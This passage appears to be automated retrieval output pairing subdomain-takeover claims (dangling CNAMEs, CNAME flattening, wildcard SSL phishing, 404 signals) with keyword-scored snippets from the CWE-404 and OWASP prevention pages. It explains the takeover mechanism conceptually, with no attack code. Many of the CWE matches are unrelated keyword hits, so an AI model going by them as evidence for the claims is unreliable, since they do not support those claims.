- score 9: References ¶ OWASP WSTG 4.1: Test for Subdomain Takeover Microsoft: Prevent Dangling DNS Entries and Avoid Subdomain Takeover
  - overlap: `takeover`
- score 8: Limit the Blast Radius with Proper Security Scoping ¶ Even if a subdomain takeover occurs, limit the damage by properly scoping security controls: Cookies: Do not scope session cookies to the parent domain ( .example.com ) unless necessary.
  - overlap: `cookies, takeover`
- score 7: Open-source tools for detection: dnsReaper : Actively maintained subdomain takeover scanner supporting 40+ service fingerprints with signature-based detection nuclei : General-purpose vulnerability scanner with a dedicated set of subdomain takeover detection templates can-i-take-over-xyz : Community-maintained reference documenting which services are and are not vulnerable, with proof-of-concept details 4.
  - overlap: `takeover`

## `subdomain_takeover.auto.03`

**Claim:** This can, over time, give the attacker access to all traffic destined for the vulnerable domain, including all its subdomains.

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 2: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: ``
- score 1: CWE-404: Improper Resource Shutdown or Release (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `access`
- score 1: Impact Details DoS: Resource Consumption (Other); Varies by Context Scope: Availability, Other Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service attack by depleting the resource pool.
  - overlap: `attacker`
- score 1: Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.) Effectiveness: High
  - overlap: `vulnerable`
- score 1: Extended Description When a resource is created or allocated, the developer is responsible for properly releasing the resource as well as accounting for all potential paths of expiration or invalidation, such as a set period of time or revocation.
  - overlap: `time`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html
status `ACTIVE`, 36257 chars
- score 9: How Subdomain Takeover Works ¶ The Basic Mechanism ¶ An organization creates a DNS record: blog.example.com CNAME example-blog.herokuapp.com The Heroku app serves content on blog.example.com Months later, the team decommissions the Heroku app but forgets to remove the DNS record The CNAME still points to example-blog.herokuapp.com , which no longer exists An attacker creates a new Heroku app with the name example-blog and claims the hostname The attacker now controls what is served on blog.example.com Why It Keeps Happening ¶ The root cause is almost always a disconnect between infrastructure provisioning and DNS management: Cloud resources are temporary, DNS records are persistent.
  - overlap: `attacker`
- score 8: Subdomain Takeover Prevention Cheat Sheet ¶ Introduction ¶ Subdomain takeover is a vulnerability that occurs when a DNS record (typically a CNAME) points to a cloud resource or third-party service that has been deprovisioned or no longer exists.
  - overlap: ``
- score 8: References ¶ OWASP WSTG 4.1: Test for Subdomain Takeover Microsoft: Prevent Dangling DNS Entries and Avoid Subdomain Takeover
  - overlap: ``
- score 7: Open-source tools for detection: dnsReaper : Actively maintained subdomain takeover scanner supporting 40+ service fingerprints with signature-based detection nuclei : General-purpose vulnerability scanner with a dedicated set of subdomain takeover detection templates can-i-take-over-xyz : Community-maintained reference documenting which services are and are not vulnerable, with proof-of-concept details 4.
  - overlap: `vulnerable`
- score 7: Limit the Blast Radius with Proper Security Scoping ¶ Even if a subdomain takeover occurs, limit the damage by properly scoping security controls: Cookies: Do not scope session cookies to the parent domain ( .example.com ) unless necessary.
  - overlap: `domain`

## `subdomain_takeover.fp_rule.cname_flattening_makes_the_resolved_ip_normal_not_takeover_evidence`

**Claim:** Resolving the victim hostname to a generic provider IP is not by itself a takeover: CNAME flattening intentionally resolves the chain to a final IP address instead of returning the CNAME record, so an IP-only view of the resolution hides the very record that would identify the claimable target.

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 2: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: ``
- score 1: Impact Details DoS: Resource Consumption (Other); Varies by Context Scope: Availability, Other Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service attack by depleting the resource pool.
  - overlap: `intentionally`
- score 1: 775 Missing Release of File Descriptor or Handle after Effective Lifetime Relevant to the view "CISQ Data Protection Measures" (View-1340) Nature Type ID Name ParentOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: `view`
- score 1: 772 Missing Release of Resource after Effective Lifetime Relevant to the view "CISQ Quality Measures (2020)" (View-1305) Nature Type ID Name ParentOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: `view`
- score 1: 619 Dangling Database Cursor ('Cursor Injection') Relevant to the view "Weaknesses for Simplified Mapping of Published Vulnerabilities" (View-1003) Nature Type ID Name MemberOf View - a subset of CWE entries that provides a way of examining CWE content.
  - overlap: `view`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html
status `ACTIVE`, 36257 chars
- score 12: How Subdomain Takeover Works ¶ The Basic Mechanism ¶ An organization creates a DNS record: blog.example.com CNAME example-blog.herokuapp.com The Heroku app serves content on blog.example.com Months later, the team decommissions the Heroku app but forgets to remove the DNS record The CNAME still points to example-blog.herokuapp.com , which no longer exists An attacker creates a new Heroku app with the name example-blog and claims the hostname The attacker now controls what is served on blog.example.com Why It Keeps Happening ¶ The root cause is almost always a disconnect between infrastructure provisioning and DNS management: Cloud resources are temporary, DNS records are persistent.
  - overlap: `cname, hostname, record, takeover`
- score 11: Subdomain Takeover Prevention Cheat Sheet ¶ Introduction ¶ Subdomain takeover is a vulnerability that occurs when a DNS record (typically a CNAME) points to a cloud resource or third-party service that has been deprovisioned or no longer exists.
  - overlap: `cname, record, takeover`
- score 9: Table of contents Introduction How Subdomain Takeover Works The Basic Mechanism Why It Keeps Happening Record Types at Risk Cloud Provider Vulnerability Reference High Risk: Takeover Possible When Resource Is Removed Conditional Risk: Takeover Possible Under Specific Circumstances Service Fingerprints for Detection Prevention Strategies 1.
  - overlap: `provider, record, takeover`
- score 9: Table of contents Introduction How Subdomain Takeover Works The Basic Mechanism Why It Keeps Happening Record Types at Risk Cloud Provider Vulnerability Reference High Risk: Takeover Possible When Resource Is Removed Conditional Risk: Takeover Possible Under Specific Circumstances Service Fingerprints for Detection Prevention Strategies 1.
  - overlap: `provider, record, takeover`
- score 9: References ¶ OWASP WSTG 4.1: Test for Subdomain Takeover Microsoft: Prevent Dangling DNS Entries and Avoid Subdomain Takeover
  - overlap: `takeover`

## `subdomain_takeover.impact.ht_a_domain_owner_will_be_unaware_of`

**Claim:** A taken-over subdomain is dangerous beyond content control because the attacker's service can inherit the domain owner's wildcard SSL, making phishing on the subdomain TLS-trusted and unknown to the owner.

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 2: Impact Details DoS: Resource Consumption (Other); Varies by Context Scope: Availability, Other Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service attack by depleting the resource pool.
  - overlap: `attacker, service`
- score 2: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: ``
- score 1: CWE-404: Improper Resource Shutdown or Release (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `content`
- score 1: Taxonomy Mappings Mapped Taxonomy Name Node ID Fit Mapped Node Name PLOVER Improper resource shutdown or release 7 Pernicious Kingdoms Unreleased Resource OWASP Top Ten 2004 A9 CWE More Specific Denial of Service CERT C Secure Coding FIO42-C CWE More Abstract Close files when they are no longer needed CERT C Secure Coding MEM31-C CWE More Abstract Free dynamically allocated memory when no longer needed The CERT Oracle Secure Coding Standard for Java (2011) FIO04-J Release resources when they are no longer needed Software Fault Patterns SFP14 Failure to release resource
  - overlap: `service`
- score 1: Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.) Effectiveness: High
  - overlap: `control`

## `subdomain_takeover.signal.ht_1_attached_to_a_third_party_domai`

**Claim:** A dangling CNAME candidate is signalled by the hostname answering with a 404 not found error from the third-party destination it is attached to.

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 2: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: ``
- score 1: 619 Dangling Database Cursor ('Cursor Injection') Relevant to the view "Weaknesses for Simplified Mapping of Published Vulnerabilities" (View-1003) Nature Type ID Name MemberOf View - a subset of CWE entries that provides a way of examining CWE content.
  - overlap: `dangling`
- score 1: Resultant (where the weakness is typically related to the presence of some other weaknesses) Improper release or shutdown of resources can be resultant from improper error handling or insufficient resource tracking.
  - overlap: `error`
- score 1: If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.
  - overlap: `error`
- score 1: If you allocate memory that you intend to free upon completion of the function, you must be sure to free the memory at all exit points for that function including error conditions.
  - overlap: `error`

## `subdomain_takeover.variant.ht_subs_or_top_level_domain_cname`

**Claim:** A dangling record that enables takeover can be a CNAME or an A record pointing at third-party services, so DNS enumeration has to inspect both record types instead of CNAMEs alone.

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 2: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: ``
- score 1: 619 Dangling Database Cursor ('Cursor Injection') Relevant to the view "Weaknesses for Simplified Mapping of Published Vulnerabilities" (View-1003) Nature Type ID Name MemberOf View - a subset of CWE entries that provides a way of examining CWE content.
  - overlap: `dangling`
- score 1: April 30, 2026 Site Map | Terms of Use | Manage Cookies | Cookie Notice | Privacy Policy | Contact Us | Use of the Common Weakness Enumeration (CWE™) and the associated references from this website are subject to the Terms of Use .
  - overlap: `enumeration`
- score 1: For example, run the product under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS.
  - overlap: `services`
- score 1: CWE-404: Improper Resource Shutdown or Release (4.20) Common Weakness Enumeration Celebrating 20 years of community-developed cybersecurity weakness knowledge!
  - overlap: `enumeration`
